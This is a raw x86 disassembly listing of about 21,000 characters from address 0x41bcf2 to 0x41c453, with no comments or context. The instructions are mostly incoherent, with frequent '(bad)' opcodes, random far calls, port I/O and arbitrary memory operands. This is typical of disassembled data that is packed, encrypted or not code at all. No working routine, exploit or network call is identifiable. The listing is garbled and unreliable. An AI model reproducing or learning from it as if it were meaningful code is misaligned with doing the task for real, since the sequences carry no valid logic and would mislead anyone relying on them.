  41bcf2:	jle    0x41bd1d
  41bcf4:	mov    esp,0xabcc40d5
  41bcf9:	fwait
  41bcfa:	inc    eax
  41bcfb:	mov    bh,0x2b
  41bcfd:	adc    ch,BYTE PTR [edi+0x12]
  41bd00:	sub    al,0xd2
  41bd02:	push   edi
  41bd03:	sub    cl,BYTE PTR [edi]
  41bd05:	or     BYTE PTR [ecx+0x4f9cef69],0xee
  41bd0c:	outs   dx,DWORD PTR ds:[esi]
  41bd0d:	mov    edx,0xd4b42062
  41bd12:	repz push 0x6
  41bd15:	aam    0x9e
  41bd17:	jne    0x41bd95
  41bd19:	jb     0x41bd22
  41bd1b:	aad    0x48
  41bd1d:	mov    BYTE PTR [edi+0x578ef9f1],dl
  41bd23:	(bad)  
  41bd24:	xchg   DWORD PTR [ebx-0x1dc86da8],edx
  41bd2a:	ficom  DWORD PTR [eax+0xa]
  41bd2d:	sbb    al,0x6c
  41bd2f:	cmp    DWORD PTR [eax+0x79],eax
  41bd32:	lahf   
  41bd33:	xchg   cl,dh
  41bd35:	fucomp st(5)
  41bd37:	push   eax
  41bd38:	mov    al,ds:0x5fe57960
  41bd3d:	jp     0x41bd12
  41bd3f:	jnp    0x41bceb
  41bd41:	ret    
  41bd42:	fdivr  DWORD PTR [esi]
  41bd44:	inc    ebp
  41bd45:	push   0xffffffc7
  41bd47:	inc    esp
  41bd48:	loop   0x41bccc
  41bd4a:	scas   al,BYTE PTR es:[edi]
  41bd4b:	test   BYTE PTR [edi+ebp*8+0x24],bl
  41bd4f:	mov    cl,0xa9
  41bd51:	aad    0x27
  41bd53:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd55:	adc    edx,0xc
  41bd58:	cmp    BYTE PTR [esi+0x3f523f50],dl
  41bd5e:	sub    edx,DWORD PTR [edi-0x1f]
  41bd61:	ret    0x9484
  41bd64:	push   ebx
  41bd65:	aas    
  41bd66:	int    0xe2
  41bd68:	and    al,dl
  41bd6a:	pop    esi
  41bd6b:	leave  
  41bd6c:	mov    eax,ds:0xbdcfbb11
  41bd71:	sub    BYTE PTR [esi],ch
  41bd73:	mul    DWORD PTR [ecx]
  41bd75:	(bad)  
  41bd77:	sub    esi,esi
  41bd79:	outs   dx,DWORD PTR ds:[esi]
  41bd7a:	xchg   ebx,eax
  41bd7b:	mov    edx,0x3f90541f
  41bd80:	jnp    0x41be00
  41bd82:	call   0x8b1b:0xab1a1dde
  41bd89:	dec    ebp
  41bd8a:	or     cl,ch
  41bd8c:	xor    BYTE PTR [edx],al
  41bd8e:	add    BYTE PTR [eax],al
  41bd90:	into   
  41bd91:	leave  
  41bd92:	leave  
  41bd93:	rcr    ecx,0xc1
  41bd96:	(bad)  
  41bd97:	fldcw  WORD PTR [ebx+0x3e]
  41bd9a:	stc    
  41bd9b:	push   0xffffff91
  41bd9d:	xor    eax,0xeaa05943
  41bda2:	jg     0x41be1c
  41bda4:	adc    BYTE PTR [esi+0x78],bh
  41bda7:	js     0x41be0b
  41bda9:	aaa    
  41bdaa:	inc    ebx
  41bdab:	cmp    eax,0x640b370c
  41bdb0:	cld    
  41bdb1:	les    ebp,FWORD PTR [ebx-0x5f]
  41bdb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdb5:	shl    cl,1
  41bdb7:	xchg   edi,eax
  41bdb8:	sub    ecx,esp
  41bdba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdbb:	das    
  41bdbc:	shl    DWORD PTR [ecx],0x69
  41bdbf:	clc    
  41bdc0:	mov    ds:0x700dcca3,al
  41bdc5:	outs   dx,DWORD PTR ds:[esi]
  41bdc6:	mov    ebp,0xaf81c09a
  41bdcb:	xchg   DWORD PTR [edi-0x69],ecx
  41bdce:	xchg   ebp,eax
  41bdcf:	call   0x2608:0x3363a054
  41bdd6:	ins    BYTE PTR es:[edi],dx
  41bdd7:	mov    edi,0xb9522034
  41bddc:	nop
  41bddd:	jae    0x41bdd0
  41bddf:	xstore-rng (bad)
  41bde0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bde1:	xchg   DWORD PTR [eax+0x6b51d1a8],ebp
  41bde7:	outs   dx,BYTE PTR ds:[esi]
  41bde8:	ldmxcsr DWORD PTR ds:0xef9abb49
  41bdef:	sbb    esp,DWORD PTR [ebx+0x6a994e19]
  41bdf5:	add    BYTE PTR [edx-0x7af297b0],ah
  41bdfb:	repz out dx,al
  41bdfd:	bound  esi,QWORD PTR [edx-0x46a1ac53]
  41be03:	std    
  41be04:	ss inc ebp
  41be06:	js     0x41be4c
  41be08:	lods   al,BYTE PTR cs:[esi]
  41be0a:	ror    BYTE PTR [ecx],1
  41be0c:	lahf   
  41be0d:	dec    esi
  41be0e:	cdq    
  41be0f:	sub    al,BYTE PTR [ebp+esi*1-0x53]
  41be13:	jne    0x41be45
  41be15:	jmp    0x41be0f
  41be17:	add    BYTE PTR ds:0x82e9d5b2,0xf6
  41be1e:	inc    esi
  41be1f:	push   ecx
  41be20:	inc    ah
  41be22:	fisttp QWORD PTR [eax]
  41be24:	push   ss
  41be25:	inc    ebp
  41be26:	dec    eax
  41be27:	cmp    ah,BYTE PTR [ebp-0x23]
  41be2a:	sub    DWORD PTR [ebp-0x2d],eax
  41be2d:	repnz add DWORD PTR [edi+0x3a],esp
  41be31:	sbb    esi,DWORD PTR [edi+0x74]
  41be34:	ja     0x41be88
  41be36:	cmp    al,0xa3
  41be38:	lods   eax,DWORD PTR ds:[esi]
  41be39:	dec    esi
  41be3a:	sbb    edi,DWORD PTR [edx+0x6dce8f2d]
  41be40:	call   0xbf368e4a
  41be45:	ds push ebx
  41be47:	retf   0xaca1
  41be4a:	mov    al,0xde
  41be4c:	pop    esp
  41be4d:	mov    DWORD PTR [edi],ebp
  41be4f:	lds    ebx,FWORD PTR [edi+0x44]
  41be52:	xlat   BYTE PTR ds:[ebx]
  41be53:	pop    ebx
  41be54:	pop    ecx
  41be55:	out    0xae,al
  41be57:	rcl    DWORD PTR [eax],cl
  41be59:	xchg   edx,eax
  41be5a:	cdq    
  41be5b:	outs   dx,DWORD PTR ds:[esi]
  41be5c:	dec    esp
  41be5d:	jge    0x41be54
  41be5f:	pop    edx
  41be60:	(bad)  
  41be62:	sbb    BYTE PTR [esi],ch
  41be64:	imul   esi,DWORD PTR [edx-0x16],0x306e26f1
  41be6b:	popa   
  41be6c:	jb     0x41be8e
  41be6e:	mov    dl,0x55
  41be70:	and    DWORD PTR [esi],edi
  41be72:	adc    al,0x88
  41be74:	fs or  eax,0x3d9bff75
  41be7a:	push   ds
  41be7b:	jge    0x41bed2
  41be7d:	ror    DWORD PTR [esi+ebx*4+0x17],1
  41be81:	xchg   DWORD PTR [ecx-0x61],edi
  41be84:	sub    BYTE PTR [ebp+0x46],ah
  41be87:	mov    esp,0x8a01dea7
  41be8c:	push   ebx
  41be8d:	mov    esi,0xe0fbc0c3
  41be92:	adc    dl,bl
  41be94:	mov    ds:0xcc06dbc9,al
  41be99:	or     eax,0xb03b2443
  41be9e:	pop    eax
  41be9f:	pushw  0x1370
  41bea3:	add    BYTE PTR [eax-0x23],dl
  41bea6:	pop    eax
  41bea7:	ins    DWORD PTR es:[edi],dx
  41bea8:	loope  0x41beef
  41beaa:	push   esp
  41beab:	and    ecx,DWORD PTR [ebx+0xda6e493]
  41beb1:	xor    BYTE PTR [esi+0x6a85db7e],cl
  41beb7:	ins    DWORD PTR es:[edi],dx
  41beb8:	int    0x24
  41beba:	pop    ecx
  41bebb:	mov    ebp,0x6620db8b
  41bec0:	jo     0x41be9c
  41bec2:	jp     0x41be79
  41bec4:	mov    dh,0x1a
  41bec6:	data16 adc BYTE PTR [eax],0x40
  41beca:	(bad)  
  41becb:	aaa    
  41becc:	add    BYTE PTR [edx],0x4f
  41becf:	xor    dh,BYTE PTR [edx+0x7feb7916]
  41bed5:	xchg   esp,eax
  41bed6:	inc    eax
  41bed7:	jno    0x41beda
  41bed9:	mov    dl,bl
  41bedb:	fwait
  41bedc:	adc    BYTE PTR [ebx],0xfb
  41bedf:	mov    gs,WORD PTR [ecx+0x3762eb7d]
  41bee5:	rcr    dh,0x97
  41bee8:	or     eax,0xf1ac5400
  41beed:	int    0x40
  41beef:	pop    eax
  41bef0:	inc    esp
  41bef1:	retf   0x90b
  41bef4:	loopne 0x41bf55
  41bef6:	pop    ecx
  41bef7:	cmp    ecx,ecx
  41bef9:	pop    eax
  41befa:	xchg   DWORD PTR ds:0xe54633b0,ecx
  41bf00:	xchg   ecx,eax
  41bf01:	je     0x41beeb
  41bf03:	out    0x70,al
  41bf05:	adc    al,0x20
  41bf07:	ja     0x41bf68
  41bf09:	mov    ds:0x3c03e1ef,al
  41bf0e:	pop    ss
  41bf0f:	call   0x4e91:0x2cfa0a1e
  41bf16:	ins    BYTE PTR es:[edi],dx
  41bf17:	lds    ecx,FWORD PTR [eax]
  41bf19:	sub    BYTE PTR [eax],cl
  41bf1b:	xchg   ecx,eax
  41bf1c:	(bad)  
  41bf1d:	inc    ebx
  41bf1e:	xchg   DWORD PTR [eax-0x2d0ed054],esp
  41bf24:	xor    ecx,DWORD PTR [edi]
  41bf26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf27:	xchg   DWORD PTR [ecx+edx*8],ebp
  41bf2a:	test   edx,ebx
  41bf2c:	addr16 repz (bad) 
  41bf2f:	sbb    esp,ebp
  41bf31:	cmp    al,0x5a
  41bf33:	inc    dx
  41bf35:	les    eax,FWORD PTR [ebx]
  41bf37:	ds hlt 
  41bf39:	rcl    DWORD PTR [eax-0x2b],1
  41bf3c:	out    dx,eax
  41bf3d:	call   0x9974:0x5ae6b8d5
  41bf44:	dec    edi
  41bf45:	jb     0x41bf0e
  41bf47:	popf   
  41bf48:	out    dx,eax
  41bf49:	push   edi
  41bf4a:	scas   al,BYTE PTR es:[edi]
  41bf4b:	jg     0x41bfb2
  41bf4d:	and    dh,BYTE PTR ds:0x77778771
  41bf53:	leave  
  41bf54:	aad    0x7b
  41bf56:	xchg   esi,eax
  41bf57:	call   0x289f:0x12813e0f
  41bf5e:	xchg   esi,eax
  41bf5f:	jmp    0x41beff
  41bf61:	fbstp  TBYTE PTR [eax]
  41bf63:	repz inc ebx
  41bf65:	sbb    bl,0xc5
  41bf68:	xor    eax,0x93c9ccaf
  41bf6d:	jecxz  0x41befe
  41bf6f:	retf   
  41bf70:	nop
  41bf71:	push   eax
  41bf72:	sbb    al,BYTE PTR ds:0x992492c5
  41bf78:	call   0x5bf036a2
  41bf7d:	xchg   DWORD PTR [ebx],esp
  41bf7f:	dec    esp
  41bf80:	inc    ecx
  41bf81:	cwde   
  41bf82:	daa    
  41bf83:	jl     0x41bfe3
  41bf85:	(bad)  
  41bf86:	int    0x86
  41bf88:	or     eax,ecx
  41bf8a:	cmc    
  41bf8b:	mov    al,0x88
  41bf8d:	cs and al,0x2d
  41bf90:	add    ebp,DWORD PTR [eax]
  41bf92:	aad    0x7f
  41bf94:	retf   
  41bf95:	es jno 0x41bf1c
  41bf98:	mov    al,ds:0x961da3ea
  41bf9d:	loopne 0x41bfe2
  41bf9f:	ret    
  41bfa0:	in     eax,0xc7
  41bfa2:	jae    0x41c001
  41bfa4:	out    dx,eax
  41bfa5:	(bad)  
  41bfa6:	fsub   DWORD PTR [ecx+0x1de941b1]
  41bfac:	cmp    BYTE PTR [ebp-0x49],al
  41bfaf:	cmp    BYTE PTR [edi],ch
  41bfb1:	and    DWORD PTR [ebp-0x7a85ae78],0xe47a7477
  41bfbb:	idiv   DWORD PTR [eax-0x3e]
  41bfbe:	inc    eax
  41bfbf:	mov    bh,0x8d
  41bfc1:	mov    WORD PTR [edx],cs
  41bfc3:	cwde   
  41bfc4:	jb     0x41bff8
  41bfc6:	add    BYTE PTR [ebx],bh
  41bfc8:	enter  0x850f,0x8d
  41bfcc:	hlt    
  41bfcd:	(bad)  
  41bfce:	dec    DWORD PTR [ebx+0x5e9de]
  41bfd4:	add    BYTE PTR [eax],al
  41bfd6:	mov    ebx,0x327298
  41bfdb:	mov    eax,DWORD PTR [ebp-0x4]
  41bfde:	jmp    0x41c213
  41bfe3:	mov    edi,0xc5c6c0c6
  41bfe9:	(bad)
  41bfec:	xlat   BYTE PTR ds:[ebx]
  41bfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfee:	inc    edx
  41bfef:	(bad)  
  41bff1:	test   eax,0x7fe8b872
  41bff6:	js     0x41c008
  41bff8:	jle    0x41c072
  41bffa:	js     0x41c078
  41bffc:	mov    edi,0x87bf1f90
  41c001:	cmp    DWORD PTR [esi-0x9],esi
  41c004:	int    0x85
  41c006:	dec    ebp
  41c007:	xor    ch,cl
  41c009:	jg     0x41bfc5
  41c00b:	(bad)  
  41c00c:	cs pop ds
  41c00e:	dec    ebp
  41c00f:	mov    ecx,0x77a8821e
  41c014:	sbb    BYTE PTR [ebx-0x54],0xce
  41c018:	iret   
  41c019:	fidivr WORD PTR [ecx-0x5f384ef2]
  41c01f:	js     0x41bfed
  41c021:	sbb    eax,0x16265e9e
  41c026:	sbb    DWORD PTR [esi],eax
  41c028:	xor    esp,DWORD PTR [ebx]
  41c02a:	jl     0x41c01f
  41c02c:	mov    ah,0xae
  41c02e:	mov    eax,ebx
  41c030:	or     eax,DWORD PTR [esi+0x1b4f7486]
  41c036:	loope  0x41bfd7
  41c038:	mov    WORD PTR [edx],?
  41c03a:	push   es
  41c03b:	cmp    bl,dh
  41c03d:	idiv   BYTE PTR [ebx]
  41c03f:	jg     0x41c03e
  41c041:	xchg   edx,eax
  41c042:	test   DWORD PTR [ecx-0x7f77f6d5],ebx
  41c048:	lahf   
  41c049:	dec    ebp
  41c04a:	sbb    DWORD PTR [edi-0x13b38bbd],0x5fbc5e78
  41c054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c055:	push   esi
  41c056:	sbb    eax,esp
  41c058:	imul   eax,DWORD PTR [edx],0xffffff93
  41c05b:	je     0x41c0a0
  41c05d:	mov    dl,0x67
  41c05f:	adc    al,0xb8
  41c061:	sar    BYTE PTR [ecx+0x1c80169b],cl
  41c067:	push   ss
  41c068:	dec    ch
  41c06a:	or     ecx,DWORD PTR [esi-0x26ce5511]
  41c070:	dec    esi
  41c071:	push   0x95bbe1e5
  41c076:	sub    DWORD PTR [ecx+0x2d54e542],0x8ec2358f
  41c080:	icebp  
  41c081:	mov    eax,ds:0x30afcec0
  41c086:	dec    edi
  41c087:	cdq    
  41c088:	lahf   
  41c089:	cdq    
  41c08a:	les    ecx,FWORD PTR [edx+0x2982817b]
  41c090:	fcmovnbe st,st(4)
  41c092:	sub    eax,0x9c1467f8
  41c097:	test   ah,bl
  41c099:	push   es
  41c09a:	pop    esi
  41c09b:	inc    edx
  41c09c:	cdq    
  41c09d:	not    BYTE PTR [ebx+eiz*1+0x2b]
  41c0a1:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41c0a3:	cmc    
  41c0a4:	iret   
  41c0a5:	scas   eax,DWORD PTR es:[edi]
  41c0a6:	jne    0x41c0d8
  41c0a8:	mov    eax,ds:0xd5be6f7a
  41c0ad:	popf   
  41c0ae:	mov    DWORD PTR [esi+0x68c557cf],edx
  41c0b4:	xchg   esp,eax
  41c0b5:	cmp    BYTE PTR ds:0x32f843c1,0x92
  41c0bc:	mov    edi,0xa8eb8641
  41c0c1:	mov    eax,ds:0xdf07d8df
  41c0c6:	rol    DWORD PTR [edx],cl
  41c0c8:	add    ecx,ecx
  41c0ca:	in     al,0x69
  41c0cc:	sti    
  41c0cd:	sbb    BYTE PTR [esi+0x57],dl
  41c0d0:	cmp    edi,DWORD PTR [eax-0x2e]
  41c0d3:	cmp    al,0x16
  41c0d5:	psllw  mm6,QWORD PTR [ebp-0x7aeee36d]
  41c0dc:	pop    eax
  41c0dd:	pop    eax
  41c0de:	sub    bh,BYTE PTR [ebp+eiz*1+0x1e]
  41c0e2:	fld    TBYTE PTR [edx+esi*4-0x25e703b6]
  41c0e9:	dec    ecx
  41c0ea:	fstp   QWORD PTR [esi]
  41c0ec:	xchg   ebx,eax
  41c0ed:	icebp  
  41c0ee:	imul   ecx,DWORD PTR [edi+0x28],0x3c
  41c0f2:	and    eax,0xd1d301cb
  41c0f7:	jns    0x41c0e6
  41c0f9:	mov    al,0x86
  41c0fb:	jg     0x41c169
  41c0fd:	aad    0xc8
  41c0ff:	add    al,dl
  41c101:	mov    dh,dl
  41c103:	sbb    esp,DWORD PTR [edx-0x471d49fe]
  41c109:	mov    dl,0x57
  41c10b:	jae    0x41c0df
  41c10d:	bound  edi,QWORD PTR [edi-0x43c52203]
  41c113:	outs   dx,DWORD PTR ds:[esi]
  41c114:	ss gs ds pop ecx
  41c118:	or     dl,ah
  41c11a:	outs   dx,DWORD PTR ds:[esi]
  41c11b:	push   ecx
  41c11c:	data16 jb 0x41c0e0
  41c11f:	pop    es
  41c120:	loop   0x41c147
  41c122:	push   esi
  41c123:	add    dl,ch
  41c125:	mov    ch,0xc4
  41c127:	and    ebp,DWORD PTR [ebx]
  41c129:	mov    ah,0xbf
  41c12b:	nop
  41c12c:	mov    ebp,0x110296c5
  41c131:	xor    edi,DWORD PTR [ecx-0x2a699eff]
  41c137:	test   eax,0xcf48c177
  41c13c:	out    0xde,eax
  41c13e:	std    
  41c13f:	pop    ds
  41c140:	push   bx
  41c142:	fbld   TBYTE PTR [bx+di-0x465f]
  41c147:	pop    ss
  41c148:	xlat   BYTE PTR ds:[ebx]
  41c149:	cmp    ecx,edi
  41c14b:	test   BYTE PTR [edi+0x6b],0xb1
  41c14f:	mov    DWORD PTR [ebp+edi*2-0x7e],ebx
  41c153:	out    0x8,eax
  41c155:	aad    0xdc
  41c157:	xchg   esi,eax
  41c158:	jle    0x41c182
  41c15a:	sbb    eax,0x2b5a31b3
  41c15f:	pop    esp
  41c160:	mov    al,BYTE PTR [edi-0x30]
  41c163:	mov    ecx,0x4cc81f6a
  41c168:	jno    0x41c190
  41c16a:	ins    BYTE PTR es:[edi],dx
  41c16b:	fsub   QWORD PTR [esi]
  41c16d:	hlt    
  41c16e:	cwde   
  41c16f:	dec    eax
  41c170:	loope  0x41c1af
  41c172:	xchg   edx,eax
  41c173:	aad    0x5d
  41c175:	out    0x28,eax
  41c177:	cmp    BYTE PTR [ebx],0x7a
  41c17a:	retf   0xa7cf
  41c17d:	mov    BYTE PTR [eax],al
  41c17f:	jmp    0x4717008f
  41c184:	sbb    bl,BYTE PTR [ebx]
  41c186:	test   bl,dh
  41c188:	jecxz  0x41c1a9
  41c18a:	sbb    esi,DWORD PTR [edx+0x38]
  41c18d:	mov    dh,0x28
  41c18f:	out    dx,al
  41c190:	fcom   st(0)
  41c192:	sub    ah,dl
  41c194:	nop
  41c195:	cmp    BYTE PTR [edi+edi*1+0xf],al
  41c199:	pop    es
  41c19a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c19b:	mov    WORD PTR [ebx],ds
  41c19d:	js     0x41c133
  41c19f:	mov    edx,0x1a73ee6b
  41c1a4:	cld    
  41c1a5:	and    esi,DWORD PTR [ecx+0x446d2620]
  41c1ab:	das    
  41c1ac:	push   ecx
  41c1ad:	pop    ecx
  41c1ae:	daa    
  41c1af:	xchg   ecx,eax
  41c1b0:	fwait
  41c1b1:	cwde   
  41c1b2:	pop    esp
  41c1b3:	(bad)  
  41c1b4:	lock pop es
  41c1b6:	(bad)  
  41c1b7:	popa   
  41c1b8:	fwait
  41c1b9:	xchg   ecx,ebx
  41c1bb:	scas   eax,DWORD PTR es:[edi]
  41c1bc:	scas   eax,DWORD PTR es:[edi]
  41c1bd:	xor    ebx,eax
  41c1bf:	scas   al,BYTE PTR es:[edi]
  41c1c0:	test   ah,dh
  41c1c2:	mov    cl,0x2c
  41c1c4:	fwait
  41c1c5:	jg     0x41c1d2
  41c1c7:	adc    DWORD PTR [esi],edx
  41c1c9:	hlt    
  41c1ca:	xor    eax,0xb9401f56
  41c1cf:	adc    BYTE PTR [edi+0x63feb3cc],al
  41c1d5:	mov    dh,0x1f
  41c1d7:	out    dx,al
  41c1d8:	jmp    0x56c22844
  41c1dd:	(bad)  [edx+0x6672f5bf]
  41c1e3:	adc    BYTE PTR [ecx-0x25ce36db],bl
  41c1e9:	or     al,0x70
  41c1eb:	ret    
  41c1ec:	mov    bh,0x68
  41c1ee:	pop    ds
  41c1ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1f0:	add    al,0xf0
  41c1f2:	mov    al,0xde
  41c1f4:	(bad)  
  41c1f5:	(bad)  
  41c1f7:	shl    edi,cl
  41c1f9:	ret    
  41c1fa:	adc    ch,BYTE PTR [edx]
  41c1fc:	mov    al,ds:0xde8ba8f9
  41c201:	out    0x20,eax
  41c203:	cmc    
  41c204:	sbb    ch,BYTE PTR [esi-0x7fee32f6]
  41c20a:	jge    0x41c1d2
  41c20c:	out    0x79,eax
  41c20e:	div    BYTE PTR [esi+0x35d822fc]
  41c214:	push   eax
  41c215:	or     BYTE PTR [ecx+0x7],dl
  41c218:	add    eax,ebx
  41c21a:	jmp    0x41c44f
  41c21f:	cmp    al,0xc7
  41c221:	(bad)
  41c224:	rol    esp,0xc5
  41c227:	jb     0x41c1ac
  41c229:	dec    ebx
  41c22a:	pop    ebx
  41c22b:	push   eax
  41c22c:	push   edi
  41c22d:	gs jge 0x41c280
  41c230:	out    dx,al
  41c231:	jg     0x41c2ab
  41c233:	adc    BYTE PTR [esi+0x78],bh
  41c236:	js     0x41c2a1
  41c238:	sub    eax,0xdf54c2da
  41c23d:	jnp    0x41c22e
  41c23f:	cmp    DWORD PTR [edx+ebp*8],esp
  41c242:	out    dx,eax
  41c243:	sbb    al,0x3e
  41c245:	popa   
  41c246:	adc    al,BYTE PTR [ecx+edx*1-0x68887f67]
  41c24d:	rcl    ch,cl
  41c24f:	fndisi(8087 only) 
  41c251:	rcr    BYTE PTR [edx+0x18],1
  41c254:	push   ecx
  41c255:	and    eax,DWORD PTR [edi+0xd09530d]
  41c25b:	or     eax,0x64fce32
  41c260:	add    DWORD PTR [eax+0x155b19f],esp
  41c266:	in     al,0x3e
  41c268:	sbb    ebp,DWORD PTR [eax+0x2b]
  41c26b:	bound  ebx,QWORD PTR [esi]
  41c26d:	dec    ebp
  41c26f:	ficom  WORD PTR [ebx+eax*2-0x47]
  41c273:	in     al,dx
  41c274:	mov    bl,0x46
  41c276:	(bad)  
  41c277:	mov    eax,0x3bd77650
  41c27c:	sub    al,0xaf
  41c27e:	sar    BYTE PTR [edx+0x47],0xf9
  41c282:	in     al,dx
  41c283:	xor    BYTE PTR [ecx],ch
  41c285:	jae    0x41c297
  41c287:	jbe    0x41c2bf
  41c289:	repnz fiadd DWORD PTR ds:0xda110a8e
  41c290:	mov    al,cs:0xdf0bfb3e
  41c296:	std    
  41c297:	stc    
  41c298:	mov    al,ds:0x16fe65bb
  41c29d:	mov    edi,0x2e4c91a7
  41c2a2:	adc    BYTE PTR [eax+0x6e],ah
  41c2a5:	aaa    
  41c2a6:	fiadd  DWORD PTR [edx-0x76]
  41c2a9:	mov    ah,0xb9
  41c2ab:	mov    bl,0xb6
  41c2ad:	pop    ecx
  41c2ae:	xor    bh,BYTE PTR [ebp-0x31]
  41c2b1:	pushf  
  41c2b2:	fsub   QWORD PTR [ebx+0x5e]
  41c2b5:	fist   WORD PTR [esi+ebp*2]
  41c2b8:	lahf   
  41c2b9:	inc    edi
  41c2ba:	data16 sub al,0x61
  41c2bd:	leave  
  41c2be:	fstp   DWORD PTR [ecx+edx*4-0x3257834d]
  41c2c5:	inc    ebx
  41c2c6:	test   BYTE PTR [ebx],cl
  41c2c8:	cmp    eax,0xd74e9663
  41c2cd:	xchg   esp,eax
  41c2ce:	fbld   TBYTE PTR [ebp+0x6e]
  41c2d1:	hlt    
  41c2d2:	das    
  41c2d3:	out    0x49,al
  41c2d5:	xlat   BYTE PTR ds:[ebx]
  41c2d6:	sbb    al,bh
  41c2d8:	loop   0x41c332
  41c2da:	adc    al,0x7a
  41c2dc:	enter  0x8d1f,0x6d
  41c2e0:	pop    ss
  41c2e1:	jno    0x41c35b
  41c2e3:	and    DWORD PTR [eax-0x13d9461d],esp
  41c2e9:	xchg   ebx,eax
  41c2ea:	es sub esp,eax
  41c2ed:	adc    eax,0xd70d8deb
  41c2f2:	sbb    al,0xac
  41c2f4:	mov    dl,BYTE PTR [ecx+0x329ad8a1]
  41c2fa:	loopne 0x41c2f1
  41c2fc:	add    DWORD PTR [edi+0x504dc42c],ebx
  41c302:	mov    ebx,0x610797b5
  41c307:	dec    esi
  41c308:	pushf  
  41c309:	outs   dx,BYTE PTR ds:[esi]
  41c30a:	adc    eax,0xcf4526a9
  41c30f:	std    
  41c310:	jmp    0x41c305
  41c312:	xchg   ebp,eax
  41c313:	or     eax,0x113256b6
  41c318:	pushf  
  41c319:	sbb    eax,0xb80a418a
  41c31e:	sbb    eax,0xe6731869
  41c324:	lahf   
  41c325:	pop    esp
  41c326:	dec    esi
  41c327:	(bad)  
  41c328:	imul   ecx,DWORD PTR [eax+edi*8],0xffffff8c
  41c32c:	jmp    0x71b1:0x4ad5336
  41c333:	xchg   ebx,eax
  41c334:	xor    BYTE PTR [ecx],ah
  41c336:	mov    edx,0xb32d9920
  41c33b:	out    dx,eax
  41c33c:	mov    al,0xb0
  41c33e:	cwde   
  41c33f:	fild   DWORD PTR [edi+0x7c]
  41c342:	aaa    
  41c343:	test   ax,0x93df
  41c347:	out    0xbe,al
  41c349:	scas   eax,DWORD PTR es:[edi]
  41c34a:	mov    ds:0x28e484f0,eax
  41c34f:	pop    ebp
  41c350:	mov    bh,0x6a
  41c352:	test   BYTE PTR [edi+0x2a404d58],ah
  41c358:	add    eax,0x7588bb15
  41c35d:	mov    bh,0xef
  41c35f:	mov    esp,0xc1173b16
  41c364:	pop    edi
  41c365:	cli    
  41c366:	mov    ecx,0x6548be0a
  41c36b:	(bad)  
  41c36c:	ds out 0x76,al
  41c36f:	in     al,0x12
  41c371:	pop    esp
  41c372:	jle    0x41c30b
  41c374:	clc    
  41c375:	shr    ah,1
  41c377:	int3   
  41c378:	or     eax,0x969092be
  41c37d:	sub    al,0xff
  41c37f:	mov    esi,0x3ca70b3e
  41c384:	fild   WORD PTR [ecx-0x4ca995b4]
  41c38a:	mov    dl,0xa2
  41c38c:	iret   
  41c38d:	out    0x81,eax
  41c38f:	sub    BYTE PTR [ebp+ebp*4-0x15],dl
  41c393:	fisub  WORD PTR [edx]
  41c395:	adc    esi,DWORD PTR [esi+esi*4]
  41c398:	xor    cl,BYTE PTR [eax+eax*4-0x32]
  41c39c:	test   DWORD PTR [ecx],0x692d905e
  41c3a2:	push   ss
  41c3a3:	cmp    ecx,DWORD PTR [esi+0x4a]
  41c3a6:	sbb    al,dh
  41c3a8:	pop    ecx
  41c3a9:	(bad)  [edx+edi*1-0x1743e110]
  41c3b0:	arpl   WORD PTR [edi+0x7c],bp
  41c3b3:	lock cli 
  41c3b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3b6:	bound  ebp,QWORD PTR [esi]
  41c3b8:	cmp    eax,0xf7dd14ee
  41c3bd:	into   
  41c3be:	into   
  41c3bf:	mov    eax,ds:0x79a1e6d7
  41c3c4:	arpl   dx,ax
  41c3c6:	sahf   
  41c3c7:	aaa    
  41c3c8:	sbb    DWORD PTR [ebp-0x6e],edi
  41c3cb:	loope  0x41c410
  41c3cd:	imul   edi,edx,0xffffffcc
  41c3d0:	mov    al,al
  41c3d2:	lods   eax,DWORD PTR ds:[esi]
  41c3d3:	push   ss
  41c3d4:	xor    DWORD PTR [eax+0x45edca40],0xf209a03c
  41c3de:	push   eax
  41c3df:	xor    BYTE PTR [edi],bh
  41c3e1:	fistp  QWORD PTR [edx+edx*8+0x1d]
  41c3e5:	in     eax,0x91
  41c3e7:	pop    es
  41c3e8:	jns    0x41c3ca
  41c3ea:	repz shrd DWORD PTR [edi-0x4d35d888],ebx,cl
  41c3f2:	cmp    al,0x2e
  41c3f4:	add    DWORD PTR [esi],ebx
  41c3f6:	jecxz  0x41c3a9
  41c3f8:	add    eax,0x44b747f9
  41c3fd:	arpl   WORD PTR [edi+ebp*1],bx
  41c400:	arpl   WORD PTR [eax],cx
  41c402:	stos   DWORD PTR es:[edi],eax
  41c403:	bound  edi,QWORD PTR [ebx-0x2b]
  41c406:	mov    ecx,0x2f4fe9e4
  41c40b:	pop    ds
  41c40c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c40d:	(bad)  
  41c40e:	div    BYTE PTR [edx+0x7a]
  41c411:	jge    0x41c40f
  41c413:	dec    esi
  41c414:	(bad)
  41c417:	int3   
  41c418:	and    edi,ebx
  41c41a:	(bad)  
  41c41b:	repnz push 0x4326294b
  41c421:	fwait
  41c422:	inc    ebx
  41c423:	push   eax
  41c424:	outs   dx,BYTE PTR ds:[esi]
  41c425:	jmp    0xcd99:0x74dfc061
  41c42c:	outs   dx,DWORD PTR ds:[esi]
  41c42d:	stos   DWORD PTR es:[edi],eax
  41c42e:	xor    ebp,DWORD PTR [eax+ecx*1-0x24cbd09d]
  41c435:	push   ebx
  41c436:	aam    0x57
  41c438:	out    dx,eax
  41c439:	cdq    
  41c43a:	sub    al,0x5
  41c43c:	fsub   QWORD PTR [edi-0x7]
  41c43f:	(bad)  
  41c440:	sub    DWORD PTR [eax+0x2c],ecx
  41c443:	(bad)  
  41c444:	std    
  41c445:	sbb    ecx,DWORD PTR ds:0xd78bdc21
  41c44b:	sub    cl,BYTE PTR [ecx]
  41c44d:	or     BYTE PTR [edx-0x160bba77],dh
  41c453:	xor    BYTE PTR [edx],al
